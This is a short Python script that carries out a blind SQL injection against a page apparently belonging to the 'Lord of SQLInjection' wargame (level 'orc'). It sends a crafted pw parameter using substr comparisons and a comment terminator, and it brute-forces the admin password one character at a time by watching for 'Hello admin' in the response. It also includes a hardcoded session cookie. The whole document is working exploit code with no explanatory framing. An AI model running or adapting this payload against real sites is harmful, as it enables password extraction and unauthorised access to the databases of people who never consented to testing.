import requests

password=''
for admin_len in range(8) :
    for admin_pass in range(ord('0'),ord('z')) :
        URL='http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?'
        query={'pw': '\' or substr(pw,1,'+str(admin_len+1)+')=\''+password+chr(admin_pass)+'\' -- '}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        cookies = {'PHPSESSID': 'ean08as37ebof2v307j3kurer3'}
        res=requests.get(URL, params=query, headers=headers, cookies=cookies)
        if("Hello admin" in res.text):
            password=password+chr(admin_pass)
            print(password)
            break